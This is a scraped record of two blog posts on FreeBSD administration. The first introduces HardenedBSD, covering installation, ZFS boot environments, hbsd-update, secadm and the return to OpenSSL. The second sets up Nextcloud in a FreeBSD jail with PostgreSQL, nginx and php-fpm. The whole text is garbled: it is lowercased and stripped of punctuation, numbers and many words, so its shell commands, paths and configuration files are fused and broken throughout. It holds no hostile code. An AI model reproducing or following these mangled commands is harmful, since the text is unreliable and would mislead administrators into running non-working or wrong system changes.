even boot latest window technology preview hardenedbsd project freebsd system code base lot security mechanism mitigation available freebsd system example entire tree disabled default hardenedbsd make secure also libressl default ssl library hardenedbsd openbsd freebsd us openssl compatibility reason comparison libressl openssl vulnerability one may see hardenedbsd freebsd successfully pulled openbsd level least goal freebsd ton code feature harder longer process achieve goal much competence security field repost comparison hardenedbsd project versus bsd system comparison also available http hardenedbsdorgcontenteasyfeaturecomparison hardenedbsd website install installation almost identical freebsd system example installation hardenedbsd system zfs boot environment shown first login installed hardenedbsd system look like ssh notme localhost password root hardenedbsdlocal freebsd hardenedbsd stable thu nov utc welcome hardenedbsd keyword sysctl secadm git githubcomhardenedbsd hardenedbsdorg edit etcmotd change login announcement root hardenedbsd zfs boot environment use pkg usual intentionally installed latest version hardenedbsd pkg warns possible compatibility issue sysutilsbeadm shell script would install anyway root hardenedbsd pkg install beadm package management tool yet installed system want fetch install yn bootstrapping pkg pkghttp please wait verifying signature trusted certificate done installing newer freebsd version package pkg ignore error set ignoreosversionyes package running kernel allow missmatch yn extracting updating hardenedbsd repository catalogue pkg repository hardenedbsd load error access repo file vardbpkgrepohardenedbsdsqlite failed file directory fetching metatxz kib fetching packagesitetxz mib processing entry newer freebsd version package ignore error set ignoreosversionyes package running kernel allow missmatch yn processing entry hardenedbsd repository update completed package processed repository date updating database digest format following package affected checked new package installed beadm hardenedbsd number package installed kib downloaded proceed action yn fetching kib checking integrity done conflicting installing extracting root hardenedbsd beadm list active mountpoint space created default nr freebsd hardenedbsd system come crippled system layout come usability zfs boot environment problem var usr filesystemsdatasets placed poolrootbename path omitted new boot environment created make beadm whole boot environment idea quite uselss package base system userspace usrlocal usr respectively along vardbpkg installed package information database protected two command easy fix crippled setup even running system without unmounting anything default hardenedbsd freebsd crippled system layout look follows root hardenedbsd zfs list name used avail refer mountpoint zroot zroot zrootroot none zrootrootdefault zroottmp tmp zrootusr usr zrootusrhome usrhome zrootusrports usrports zrootusrsrc usrsrc zrootvar var zrootvaraudit varaudit zrootvarcrash varcrash zrootvarlog varlog zrootvarmail varmail zrootvartmp vartmp two command move usr var filesystemsdatasets poolrootbename new boot environment created covered protected boot environment root hardenedbsd zfs rename u zrootusr zrootrootdefaultusr root hardenedbsd zfs rename u zrootvar zrootrootdefaultvar new layout fix shown root hardenedbsd zfs list name used avail refer mountpoint zroot zroot zrootroot none zrootrootdefault zrootrootdefaultusr usr zrootrootdefaultusrhome usrhome zrootrootdefaultusrports usrports zrootrootdefaultusrsrc usrsrc zrootrootdefaultvar var zrootrootdefaultvaraudit varaudit zrootrootdefaultvarcrash varcrash zrootrootdefaultvarlog varlog zrootrootdefaultvarmail varmail zrootrootdefaultvartmp vartmp zroottmp tmp base system update freebsd us freebsdupdate base system update hardenedbsd project us hbsdupdate tool rely delta patch root hardenedbsd freebsdupdate freebsdupdate command found hbsdupdate tool nice feature make update new separate boot environment reboot leaving running system untouched way go back upgraded system anytime anything would went wrong update procedure update installed older version make update latest version root hardenedbsd hbsdupdate v b updated latest build mb kbps verified hash checking validity public key checking validity basetxz checking validity etcupdatetbz checking validity skiptxt checking validity kernelhardenedbsdtxz checking validity obsoletefilestxt checking validity obsoletedirstxt checking validity scriptsh checking validity secadmintegriforcerules important note update includes pti patch thirdparty kernel module hardenedbsdsecadmkmod need recompiledreinstalled wish postpone installing update please hit controlc within next ten second created successfully mounted successfully tmptmptfmmbyeo applying base updating etc manual merges need done resolving conflict etcmotd select p postpone df difffull e edit h help option h p postpone ignore conflict df difffull show change made merged file e edit change merged file editor r resolved accept merged version file mf minefull accept local version entire file ignore new change tf theirsfull accept new version entire file lose local change h help show list select p postpone df difffull e edit h help option mf resolving conflict select p postpone df difffull e edit h help option tf resolving conflict etcpfos select p postpone df difffull e edit h help option tf resolving conflict etcrcinitdiskless select p postpone df difffull e edit h help option tf resolving conflict etcdevdusbconf select p postpone df difffull e edit h help option tf resolving conflict etcrcfirewall select p postpone df difffull e edit h help option tf resolving conflict etcmtreebsdrootdist select p postpone df difffull e edit h help option tf resolving conflict etcmtreebsddebugdist select p postpone df difffull e edit h help option tf resolving conflict etcmtreebsdusrdist select p postpone df difffull e edit h help option tf resolving conflict etcmtreebsdtestsdist select p postpone df difffull e edit h help option tf resolving conflict etcmtreebsdincludedist select p postpone df difffull e edit h help option tf resolving conflict etcrcdntpd select p postpone df difffull e edit h help option tf resolving conflict etcrcdfsck select p postpone df difffull e edit h help option tf resolving conflict etcrcdipsec select p postpone df difffull e edit h help option tf resolving conflict etcrcdpf select p postpone df difffull e edit h help option tf resolving conflict etcrcdsendmail select p postpone df difffull e edit h help option tf resolving conflict etcrcdipfw select p postpone df difffull e edit h help option tf resolving conflict etcservices select p postpone df difffull e edit h help option tf resolving conflict etcregdomainxml select p postpone df difffull e edit h help option tf resolving conflict etcsysctlconf select p postpone df difffull e edit h help option tf resolving conflict etcrcsubr select p postpone df difffull e edit h help option tf resolving conflict etcmailmailerconf select p postpone df difffull e edit h help option tf resolving conflict etcsshsshdconfig select p postpone df difffull e edit h help option tf resolving conflict etcmasterpasswd select p postpone df difffull e edit h help option h p postpone ignore conflict df difffull show change made merged file e edit change merged file editor r resolved accept merged version file mf minefull accept local version entire file ignore new change tf theirsfull accept new version entire file lose local change h help show list select p postpone df difffull e edit h help option df tmptmptfmmbyeoetcmasterpasswd tmptmptfmmbyeovardbetcupdateconflictsetcmasterpasswd freebsd stock toor bourneagain superuser root daemon owner many system process root usrsbinnologin operator system usrsbinnologin select p postpone df difffull e edit h help option mf resolving conflict etcdevdconf select p postpone df difffull e edit h help option tf resolving conflict etcdefaultsrcconf select p postpone df difffull e edit h help option tf updating password database applying kernel hardenedbsd removing obsolete file remove yn removing remove tmptmptfmmbyeousrliblibrtpa yn removing tmptmptfmmbyeousrliblibrtpa applying integriforce rule unmounted successfully activated successfully update procedure finished new boot environment present already set activated upon reboot root hardenedbsd beadm list active mountpoint space created default n updated r rebooting updated system may want modify file let mount boot environment purpose root hardenedbsd beadm mount updated mounted successfully root hardenedbsd beadm list active mountpoint space created default n updated r root hardenedbsd cd make needed change reboot root hardenedbsd cd root hardenedbsd beadm umount updated unmounted successfully root hardenedbsd shutdown r reboot see hardenedbsd system indeed upgraded newer version root hardenedbsd sysctl hardeningversion hardeningversion pkg warn possible incompatibility using older hardenedbsd version root hardenedbsd pkg install beadm package management tool yet installed system want fetch install yn bootstrapping pkg pkghttp please wait verifying signature trusted certificate done installing extracting updating hardenedbsd repository catalogue pkg repository hardenedbsd load error access repo file vardbpkgrepohardenedbsdsqlite failed file directory fetching metatxz kib fetching packagesitetxz mib processing entry hardenedbsd repository update completed package processed repository date updating database digest format following package affected checked new package installed beadm hardenedbsd number package installed kib downloaded proceed action yn fetching kib checking integrity done conflicting installing extracting root hardenedbsd beadm list active mountpoint space created default updated nr see still get back older boot environment hardenedbsd system needed datasets system root hardenedbsd zfs list name used avail refer mountpoint zroot zroot zrootroot none zrootrootdefault zrootrootdefaultusr usr zrootrootdefaultusrhome usrhome zrootrootdefaultusrports usrports zrootrootdefaultusrsrc usrsrc zrootrootdefaultvar var zrootrootdefaultvaraudit varaudit zrootrootdefaultvarcrash varcrash zrootrootdefaultvarlog varlog zrootrootdefaultvarmail varmail zrootrootdefaultvartmp vartmp zrootrootupdated zrootrootupdatedusr usr zrootrootupdatedusrhome usrhome zrootrootupdatedusrports usrports zrootrootupdatedusrsrc usrsrc zrootrootupdatedvar var zrootrootupdatedvaraudit varaudit zrootrootupdatedvarcrash varcrash zrootrootupdatedvarlog varlog zrootrootupdatedvarmail varmail zrootrootupdatedvartmp vartmp zroottmp tmp destroy older hardenedbsd system longer needed root hardenedbsd beadm destroy default sure want destroy default action undone n boot environment default created existing snapshot destroy updated snapshot n destroyed successfully let check running latest version root hardenedbsd hbsdupdate v b new system already latest version hardenedbsd port get general idea software freebsd port would hardenedbsd port freebsd hardenedbsd provide package built port tree freebsd package available freebsd available hardenedbsd fail build libressl freebsd still openssl base fail build hardenedbsd security mechanism mitigation enabled also one counter example rule audiolame package hardenedbsd none freebsd good thing hardenedbsd community response speed example problem sysutilsbareosclient port failed built bareosclient fails build http groupsgooglecomahardenedbsdorgforum within hour modified port allow built gnutls bug sysutilsbareosserver add gnutls option http bugsfreebsdorgbugzillashowbugcgi worked like charm fast accurate even overpriced enterprise support oracle dell emc work fast well freebsdupdate tool hardenedbsd project use portsnap tool root hardenedbsd portsnap fetch extract portsnap command found git tool used instead first need add pkg repository package shown root hardenedbsd pkg install gitlite may want use git fetch hardenedbsd port tree one thing see convenient must know github page type openbsd package like freebsd approach remember root hardenedbsd git clone http githubcomhardenedbsdhardenedbsdportsgit usrports cloning usrports remote counting object done remote compressing object done remote total delta reused delta packreused receiving object mib kib done resolving delta done checking file done let verify content root hardenedbsd find usrports head www wwwocamlnet wwwocamlnetfiles wwwocamlnetfilespatchmakefilerules wwwocamlnetdistinfo wwwocamlnetmakefile wwwocamlnetpkgdescr wwwpearservicestinyurl wwwpearservicestinyurldistinfo wwwpearservicestinyurlmakefile wwwpearservicestinyurlpkgdescr next update done using git pull command root hardenedbsd usrports git pull already date configured hardenedbsd system use gb ram zfs arc default size enough git run root hardenedbsd grep git varlogmessages apr hardenedbsd kernel pid git uid killed swap space increase amount ram process take away zfs cache arc put bootloaderconf file reboot system change take effect size ram known issue git memory usage gb root hardenedbsd cat bootloaderconf eof zfs vfszfsarcmin vfszfsarcmax eof root hardenedbsd shutdown r hardenedbsd base system source hardenedbsd base system source also fetched git tool example command fetch source root hardenedbsd git clone singlebranch branch http githubcomhardenedbsdhardenedbsdstable usrsrc cloning usrsrc remote counting object done remote compressing object done remote total delta reused delta packreused receiving object gib kib done resolving delta done root hardenedbsd security administration secadm hardenedbsd secadm tool allows user toggle exploit mitigation per application per jail basis user typically use secadm disable pageexec andor mprotect restriction use integriforce implementation verified execution enforces hash based signature binary dependent shared object first let add secadm tool pkg repository root hardenedbsd pkg search secadm hardenedbsd security administration hardenedbsd security administration root hardenedbsd pkg install secadm secadmkmod updating hardenedbsd repository catalogue hardenedbsd repository date repository date following package affected checked new package installed secadm hardenedbsd secadmkmod hardenedbsd libucl hardenedbsd number package installed kib downloaded proceed action yn fetching kib fetching kib fetching kib checking integrity done conflicting installing extracting installing extracting installing extracting message running custom kernel config please consult kernel source tree especially updatinghardenedbsd file question inform freenode irc hardenedbsd channel keywords option paxcontrolacl option paxcontrolacloverridesupport option paxcontrolextattr hbsdcontrol secadm http githubcomhardenedbsdhardenedbsdblobhardenedcurrentmasterupdatinghardenedbsd message running custom kernel config please consult kernel source tree especially updatinghardenedbsd file question inform freenode irc hardenedbsd channel keywords option paxcontrolacl option paxcontrolacloverridesupport option paxcontrolextattr hbsdcontrol secadm http githubcomhardenedbsdhardenedbsdblobhardenedcurrentmasterupdatinghardenedbsd let create simple integriforce rule bindd command root hardenedbsd cat usrlocaletcsecadmrules eof secadm integriforce path bindd hash type mode hard eof let enable secadm etcrcconf file root hardenedbsd sysrc secadmenableyes finally let start security administration mechainsm root hardenedbsd usrlocaletcrcdsecadm start starting secadm let verify really work let try modify bindd command root hardenedbsd echo bindd bindd operation permitted root hardenedbsd tail varlogmessages apr hardenedbsd kernel secadm prevented modification bindd protected secadm rule bindd command work usual root hardenedbsd bindd file record record byte transferred sec bytessec root hardenedbsd l lh file rwr r root wheel apr file resource hardenedbsd handbook mainly copied freebsd handbook chapter hardenedbsd related hardenedbsd good hardenedbsd generally modified freebsd system thing work way http hardenedbsdorgshawnhbsdhandbookbookhtml hardenedbsdsecadm hardenedbsd forum available google group http groupsgooglecomahardenedbsdorgforum forumusers list hardenedbsd application need custom secadm rule available http githubcomhardenedbsdhardenedbsdwikinoncompliantapplications also whole github page secadm rule http githubcomhardenedbsdsecadmrules twitter account hardenedbsd solobsd http twittercomhardenedbsd http twittercomsolobsd opnsense connection one last thing notice opnsense connection broadly described http wikiopnsenseorgrelationshardenedbsdhtml http update hardenedbsd switching back openssl cite hardenedbsd project site year ago hardenedbsd switched libressl default cryptographic library base followed suit later bernard spil done excellent job keeping user uptodate latest security patch libressl recently updating libressl become increasingly clear u performing major upgrade requires team larger single person upgrading caused lot fallout port tree apr several port consider high priority still broken stand right would take bernard significant amount spare personal time fix issue multiperson team dedicated maintaining libressl base along patch required port hardenedbsd use openssl going forward default crypographic library base libressl coexist openssl source tree however mklibressl default instead current yes bernard continue maintaining libressl base along addressing various problematic port entry provide user ample time plan perform update wait period two month prior making switch switch occur jul performed simultaneously hardenedbsd archive copy libresslcentric package repository binary update base period six month switch expiring package repos jan essentially give user eight full month upgrade path part switch back openssl default ntp daemon base switch back openntpd isc ntp user localopenntpdenable yes set rcconf need switch back ntpdenable yes user build base source want fully clean object directory package link libcrypto libssl need rebuilt reinstalled community help look forward day make switch back libressl hardenedbsd believe providing user option rid software monoculture better increase security manage risk update introduction hardenedbsd world article included bsd zfs user conf episode thanks mentioning update chapter hardenedbsd hardenedbsd handbook migratedported wiki page available http githubcomhardenedbsdhardenedbsdwiki enjoy eof like like loading related
397,Lobsters,freebsd,FreeBSD,Nextcloud 13 on FreeBSD,https://vermaden.wordpress.com/2018/04/04/nextcloud-13-on-freebsd/,nextcloud freebsd,host cat etcsysctlconf eof allow jail raw socket allow upgrade jail eof sysctl sysctl cat bootloaderconf eof racctrctl resource limit eof mb path desc host command nextcloudlocal command jls p axwww cpu r time command j nextcloud jail zfs create mountpointjail localjail zfs create mountpointjailnextcloud localjailnextcloud zfs create mountpointjailnextcloudvardbpostgresdata localjailnextcloudpgsql zfs get r recordsize localjail cd jailnextcloud fetch http tar unlink xpjf c jailnextcloud l jailnextcloud cat etcjailconf eof nextcloud hosthostname nextcloudlocal interface path jailnextcloud execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets allowsysvipc eof jls cat etcrcconf eof jail jailenableyes eof service jail start nextcloud jls cat etchosts eof nextcloud nextcloudlocal nextcloud eof jexec bincsh cat etchosts eof nextcloud nextcloudlocal nextcloud eof jexec bincsh newaliases v cp usrsharezoneinfoeuropewarsaw etclocaltime cat etcrcconf eof daemon yes syslogdflags sshdenableyes phpfpmenableyes postgresqlenableyes postgresqlclasspostgres postgresqldatavardbpostgresdata memcachedenableyes memcachedflags l nginxenableyes daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno cleartmpenableyes cleartmpxyes extranetfstypesnfs dumpdevno updatemotdno keyratefast eof cat etccrondsendmailcleanclientmqueue eof clean sendmail root binrm r f varspoolclientmqueue eof exit service jail restart nextcloud jls jexec nextcloud bincsh sockstat package echo nameserver etcresolvconf ping c freebsdorg grep quarterly etcpkgfreebsdconf sed squarterlylatestg etcpkgfreebsdconf grep latest etcpkgfreebsdconf pkg update f portsnap fetch extract portsnap fetch update cd usrportswwwnextcloud make rundependslist grep php make rundependslist grep database grep e az default usrportsmkbsddefaultversionsmk column cat etcmakeconf eof wrkdirprefix portsdir obj defaultversions defaultversions optionsunset mysql optionsset pgsql eof make showconfig make config make showconfig cat vardbportswwwnextcloudoptions make c usrportswwwnextcloud rundependslist grep php make c usrportswwwnextcloud rundependslist grep sql exit jexec nextcloud binsh make c usrportswwwnextcloud rundependslist read echo pkg install basename done pkg install peclsmbclient pkg search peclsmbclient pkg install gettextruntime pkg install pkg install peclsmbclient pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install nginx pkg install memcached pkg install portmaster pkg install sudo pkg install pkg install pkg install pkg install portmaster wwwnextcloud mailcclient portmaster wwwnextcloud wwwnginx databasesmemcached securitysudo mailcclient pkg info grep e phpnginxmemcachedpostgresqlsudonextcloudportmaster postgresql database cat etcloginconf eof postgres setenvlccollatec tcdefault eof grep postgres etcloginconf capmkdb etcloginconf chown postgres postgres vardbpostgresdata cat etcrcconf usrlocaletcrcdpostgresql initdb usrlocaletcrcdpostgresql start sockstat psql h nextcloudlocal u postgres grep c vardbpostgresdatapghbaconf usrlocaletcrcdpostgresql restart psql h nextcloudlocal u postgres create user nextcloud password nextclouddbpassword create database nextcloud template encoding unicode alter database nextcloud owner nextcloud q cat vardbpostgresdatavacuumsh devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull eof chmod x vardbpostgresdatavacuumsh chown postgres postgres vardbpostgresdatavacuumsh su postgres c crontab e su postgres c crontab l nginx webserver mkdir p usrlocaletcnginxssl cd usrlocaletcnginxssl openssl req node day newkey keyout nginxkey nginxcrt nextcloudserverpassword pl lodzkie lodz vermaden enterprise ltd nextcloud departament nextcloudlocal vermaden nextcloudcom chmod usrlocaletcnginxsslnginxkey l l usrlocaletcnginxssl l l varlog grep nginx chown r www www varlognginx l l varlog grep nginx cat usrlocaletcnginxnginxconf php cat cat eof postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof cat cat cat eof postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof cat varlogphpfpmlog chown www www varlogphpfpmlog grep usrlocaletcphpfpmconf cat usrlocaletcphpfpmdwwwconf cat usrlocaletcphpini daemon cat etcrcconf usrlocaletcrcdmemcached start usrlocaletcrcdphpfpm start usrlocaletcrcdpostgresql status usrlocaletcrcdnginx start sockstat l l varrunphpfpmsock nextcloud mkdir p vardbnextclouddata chown r www www vardbnextcloud chown r www www usrlocalwwwnextcloud http nextcloudlocal admin nextcloudadminpassword vardbnextclouddata nextcloud nextclouddbpassword nextcloud nextcloudlocal finish setup diff u configphporg configphp cat usrlocalwwwnextcloudconfigconfigphp sudo u www php usrlocalwwwnextcloudocc config list system log cat etcnewsyslogconf eof vardbnextclouddatanextcloudlog www www jc varlogphpfpmlog www www jc varlognginxerrorlog www www jc varlognginxaccesslog www www jc eof newsyslog v tail cleanup optional rm rf varcachepkg rm rf usrportsobj rm rf usrportsdistfiles pkg autoremove update sysv ipc jail man jail allowsysvipc sysvmsg sysvsem sysvshm inherit postgres freebsd jail http etcjailconf diff u etcjailconfold etcjailconf cat etcjailconf update setup without socket diff u usrlocaletcphpfpmdwwwconfsocket usrlocaletcphpfpmdwwwconf diff u usrlocaletcnginxnginxconfsocket usrlocaletcnginxnginxconf update nextcloud update su www c php usrlocalwwwnextcloudocc config import usrlocalsharenextcloudfixappspathsjson update nextcloud freebsd bsd zfs user conf like,today would like share setup nextcloud running freebsd system make thing interesting would running inside freebsd jail describe nextcloud setup large enough several blog post official nextcloud documentation recommends following setup mysqlmariadb php newer apache modphp prefer postgresql database mysqlmariadb prefer fast lean nginx web server apache setup based component postgresql php nginx phpfpm memcached memcached subsystem least important easily changed something modern like redis example prefer use third party tool freebsd jail management bad something like many choice good freebsd jail management want provide generic example nextcloud jail specific management tool host let start preparing freebsd host needed setting need allow using raw socket jail future optional upgrade jail also allow using chflags jail host cat etcsysctlconf eof allow jail raw socket allow upgrade jail eof host sysctl securityjailallowrawsockets host sysctl securityjailchflagsallowed would also enable rctl limit convenient resource limitation host system host cat bootloaderconf eof racctrctl resource limit eof complete jail finished installation take le size mb remove needed part installation finished complete freebsd port tree current portsnap information take gb space mb path desc jailnextcloud complete nextcloud jail jailnextcloudusrports removed install jailnextcloudvardbportsnap removed install used laptop jail host jail configured use wireless interface address distinguish command type host system nextcloudlocal jail use two different prompt way obvious command execute command host system host command command nextcloudlocal jail root nextcloud command running jail process host jls jid ip address hostname path nextcloudlocal jailnextcloud host p axwww cpu r time command j nextcloud cpu r time command usrsbinsyslogd usrsbinsshd usrsbincron postgres checkpointer process postgres postgres writer process postgres postgres wal writer process postgres postgres autovacuum launcher process postgres postgres stats collector process postgres postgres bgworker logical replication launcher postgres usrlocalbinpostgres vardbpostgresdata nginx master process usrlocalsbinnginx nginx worker process nginx nginx worker process nginx nginx worker process nginx nginx worker process nginx usrlocalbinmemcached l p varrunmemcachedmemcachedpid phpfpm master process usrlocaletcphpfpmconf phpfpm phpfpm pool www phpfpm phpfpm pool www phpfpm phpfpm pool www phpfpm phpfpm pool www phpfpm jail first prepare jail nextcloud installation let create zfs datasets purpose use local zfs pool also create zfs dataset postgresql data record size host zfs create mountpointjail localjail host zfs create mountpointjailnextcloud localjailnextcloud host zfs create mountpointjailnextcloudvardbpostgresdata localjailnextcloudpgsql host zfs get r recordsize localjail name property value source localjail recordsize default localjailnextcloud recordsize default localjailnextcloudpgsql recordsize local let fetch freebsd base jailnextcloud path host cd jailnextcloud host fetch http tar unlink xpjf c jailnextcloud mb kbps host l jailnextcloud cshrc bin copyright etc libexec mnt proc root sys usr profile boot dev lib medium net rescue sbin tmp var base freebsd jail fetched jailnextcloud path let configure host jail one jail configured simplicity nextcloudlocal jail host cat etcjailconf eof nextcloud hosthostname nextcloudlocal interface path jailnextcloud execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets allowsysvipc eof creatingmodifying etcjailconf file running jail host jls jid ip address hostname path let enable jail host system host cat etcrcconf eof jail jailenableyes eof start nextcloudlocal jail first time host service jail start nextcloud starting jail nextcloud host jls jid ip address hostname path nextcloudlocal jailnextcloud let configure nextcloudlocal name host jail host cat etchosts eof nextcloud nextcloudlocal nextcloud eof host jexec bincsh root nextcloud cat etchosts eof nextcloud nextcloudlocal nextcloud eof one remember localhost freebsd jail jail configure ip address listening purpose example important configure service host listen localhost work usual freebsd jail able connect even jail let make basic configuration nextcloud jail host jexec bincsh root nextcloud newaliases v warning local host name nextcloud qualified see cfreadme etcmailaliases alias longest byte byte total root nextcloud cp usrsharezoneinfoeuropewarsaw etclocaltime let create basic etcrcconf file jail leave service commented yet configured run want imitate debian start service default configs root nextcloud cat etcrcconf eof daemon yes syslogdflags sshdenableyes phpfpmenableyes postgresqlenableyes postgresqlclasspostgres postgresqldatavardbpostgresdata memcachedenableyes memcachedflags l nginxenableyes daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno cleartmpenableyes cleartmpxyes extranetfstypesnfs dumpdevno updatemotdno keyratefast eof disable sendmail need make sure varspoolclientmqueue would fill time let configure simple cron job root nextcloud cat etccrondsendmailcleanclientmqueue eof clean sendmail root binrm r f varspoolclientmqueue eof basic configuration let restart jail root nextcloud exit host service jail restart nextcloud stopping jail nextcloud starting jail nextcloud host jls jid ip address hostname path nextcloudlocal jailnextcloud host jexec nextcloud bincsh restart sshd daemon listening connection root nextcloud sockstat user command pid fd proto local address foreign address root sshd package let configure network connectivity jail needed get package internet root nextcloud echo nameserver etcresolvconf root nextcloud ping c freebsdorg ping freebsdorg data byte byte m byte m byte m freebsdorg ping statistic packet transmitted packet received packet loss roundtrip minavgmaxstddev m want latest package let set pkg repository config file root nextcloud grep quarterly etcpkgfreebsdconf url pkghttp pkgfreebsdorg abi quarterly root nextcloud sed squarterlylatestg etcpkgfreebsdconf root nextcloud grep latest etcpkgfreebsdconf url pkghttp pkgfreebsdorg abi latest let setup pkg fetch latest repository metadata root nextcloud pkg update f package management tool yet installed system want fetch install yn bootstrapping pkg pkghttp please wait verifying signature trusted certificate done nextcloud installing nextcloud extracting updating freebsd repository catalogue pkg repository freebsd load error access repo file vardbpkgrepofreebsdsqlite failed file directory nextcloud fetching metatxz b nextcloud fetching packagesitetxz mib processing entry freebsd repository update completed package processed repository date date freebsd port tree root nextcloud portsnap fetch extract looking portsnapfreebsdorg mirror mirror found fetching public key done fetching snapshot tag done fetching snapshot metadata done fetching snapshot generated mon apr cest mb kbps extracting snapshot done verifying snapshot integrity building new index file done root nextcloud portsnap fetch update looking portsnapfreebsdorg mirror mirror found fetching snapshot tag done port tree nt changed since last snapshot update needed port tree already date default nextcloud package repository built mysql older php thus use package everything automated compilation unavoidable root nextcloud cd usrportswwwnextcloud root nextcloud usrportswwwnextcloud make rundependslist grep php root nextcloud usrportswwwnextcloud make rundependslist grep database let check freebsd port default package version root nextcloud grep e az default usrportsmkbsddefaultversionsmk column apachedefault bdbdefault firebirddefault fortrandefault gfortran fpcdefault gccdefault ghostscriptdefault agpl lazarusdefault linuxdefault linuxdefault luadefault mysqldefault pgsqldefault phpdefault pythondefault rubydefault sambadefault ssldefault base ssldefault opensslinstalled ssldefault base tcltkdefault varnishdefault postgresql php override etcmakeconf file following setting also force using pgsql option disable mysql option port root nextcloud cat etcmakeconf eof wrkdirprefix portsdir obj defaultversions defaultversions optionsunset mysql optionsset pgsql eof let display default nextcloud port configuration root nextcloud usrportswwwnextcloud make showconfig following configuration option available exifon image rotation support ldapon ldap protocol support smbon smb network protocol support sslon ssl protocol support database backend choose least one mysqlon mysql database support pgsqloff postgresql database support sqliteoff sqlite database support use make config modify setting postgresql support even enabled let configure nextcloud port need root nextcloud usrportswwwnextcloud make config let check current port configuration root nextcloud usrportswwwnextcloud make showconfig following configuration option available exifon image rotation support ldapon ldap protocol support smbon smb network protocol support sslon ssl protocol support database backend choose least one mysqloff mysql database support pgsqlon postgresql database support sqliteoff sqlite database support use make config modify setting good case wandered setting stored answer yes delete vardbportswwwnextcloud directory brought back default without postgresql mysql root nextcloud cat vardbportswwwnextcloudoptions file autogenerated make config option filecompleteoptionslistexif ldap smb ssl mysql pgsql sqlite optionsfilesetexif optionsfilesetldap optionsfilesetsmb optionsfilesetssl optionsfileunsetmysql optionsfilesetpgsql optionsfileunsetsqlite let check rundependslist configuration root nextcloud make c usrportswwwnextcloud rundependslist grep php root nextcloud make c usrportswwwnextcloud rundependslist grep sql better make thing little faster build everything freebsd port may add needed software package switch binsh shell purpose root nextcloud usrportswwwnextcloud exit host jexec nextcloud binsh root nextcloud make c usrportswwwnextcloud rundependslist read echo pkg install basename done pkg install gettextruntime pkg install pkg install peclsmbclient pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install list command install package let paste one one nextcloudlocal prompt package build sometimes get prefix version upstream port built peclsmbclient port good example root nextcloud pkg install peclsmbclient updating freebsd repository catalogue freebsd repository date repository date pkg package available install matching peclsmbclient found repository root nextcloud pkg search peclsmbclient smbclient wrapper extension smbclient wrapper extension smbclient wrapper extension smbclient wrapper extension complete list package need install root nextcloud pkg install gettextruntime root nextcloud pkg install root nextcloud pkg install peclsmbclient root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install nginx root nextcloud pkg install memcached root nextcloud pkg install portmaster root nextcloud pkg install sudo root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install package like remove package build postgresql version like root nextcloud pkg install updating freebsd repository catalogue freebsd repository date repository date checking integrity done conflicting conflict usrlocalbinclusterdb conflict usrlocalbinclusterdb checking integrity done conflicting following package affected checked installed package removed new package installed number package removed number package installed process require mib space proceed action yn need build rest root nextcloud portmaster wwwnextcloud mailcclient following action performed installation develgmake installation develgettexttools installation installation installation printtexinfo installation installation develautoconfwrapper installation develautoconf installation installation installation wwwnextcloud installation installation installation mailcclient installation installation installation alternatively juggle package port may build everything freebsd port tree command root nextcloud portmaster wwwnextcloud wwwnginx databasesmemcached securitysudo mailcclient whichever method choose must end package installed list contain dependency root nextcloud pkg info grep e phpnginxmemcachedpostgresqlsudonextcloudportmaster c c client library memcached server highperformance distributed memory object cache system personal cloud run server robust small www server php scripting language shared extension php ctype shared extension php curl shared extension php dom shared extension php exif shared extension php fileinfo shared extension php filter shared extension php ftp shared extension php gd shared extension php gmp shared extension php hash shared extension php iconv shared extension php imap shared extension php intl shared extension php json shared extension php ldap shared extension php mbstring shared extension php opcache shared extension php openssl shared extension php pcntl shared extension php pdo shared extension php pdopgsql shared extension php php extension interfacing memcached via libmemcached library smbclient wrapper extension pgsql shared extension php posix shared extension php session shared extension php simplexml shared extension php wddx shared extension php xml shared extension php xmlreader shared extension php xmlwriter shared extension php xsl shared extension php zip shared extension php zlib shared extension php manage port without external database language postgresql database client postgresql advanced opensource database available anywhere allow others run command root postgresql database configure postgresql database first let start freebsd login class root nextcloud cat etcloginconf eof postgres setenvlccollatec tcdefault eof root nextcloud grep postgres etcloginconf postgres setenvlccollatec tcdefault root nextcloud capmkdb etcloginconf let make sure postgresql data directory belongs postgres user root nextcloud chown postgres postgres vardbpostgresdata let enable postgresql service etcrcconf file look like root nextcloud cat etcrcconf daemon yes syslogdflags sshdenableyes postgresqlenableyes postgresqlclasspostgres postgresqldatavardbpostgresdata phpfpmenableyes memcachedenableyes memcachedflags l nginxenableyes daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno cleartmpenableyes cleartmpxyes extranetfstypesnfs dumpdevno updatemotdno keyratefast may initialize start database root nextcloud usrlocaletcrcdpostgresql initdb file belonging database system owned user postgres user must also server process database cluster initialized locale collate c ctype message monetary numeric time default text search configuration set english data page checksum disabled fixing permission existing directory vardbpostgresdata ok creating subdirectory ok selecting default maxconnections selecting default sharedbuffers selecting dynamic shared memory implementation posix creating configuration file ok running bootstrap script ok performing postbootstrap initialization ok syncing data disk ok warning enabling trust authentication local connection 